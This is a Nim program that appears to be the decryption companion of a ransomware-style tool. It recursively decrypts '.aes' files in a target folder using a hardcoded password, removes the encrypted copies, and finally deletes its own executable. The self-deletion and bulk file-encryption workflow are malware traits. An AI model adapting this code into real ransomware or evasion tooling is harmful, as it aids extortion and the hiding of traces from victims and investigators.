import nimAesCrypt
import os
import strenc
import threadpool

proc DecryptFile(file: string) =
  {.gcsafe.}:
    echo file[^4..^1] & " " & file[1..^5]
    if(file[^4..^1] != ".aes"):
        echo "File is not encrypted: " & file
        return
    let password = "THISISACOMPLEXPASSWRD_201334354357"
    let decryptedFile = file[0..^5]
    decryptFile(file, decryptedFile,password,1024)
    removeFile(file)
    echo "File decrypted"


proc fileWalk(path: string) {.thread.}=
  for kind, path in walkDir(path):
    case kind:
    of pcFile:
      echo "File: ", path
      spawn DecryptFile(path)
    of pcDir:
      echo "Dir: ", path
      spawn fileWalk(path)
    of pcLinkToFile:
      echo "Link to file: ", path
    of pcLinkToDir:
      echo "Link to dir: ", path

proc selfDeletion() =
  let ownname = getAppFilename()
  echo "Deleting: ", ownname
  removeFile(ownname)

proc main() =
    # if not dirExists("./decryptedFolder/"):
    #     createDir("./decryptedFolder/")
    #     echo "Dir created: ./decryptedFolder/"
    # else:
    #     echo "Dir already exists"
    fileWalk("./sensitiveFolder/")
    sync()



main()
selfDeletion()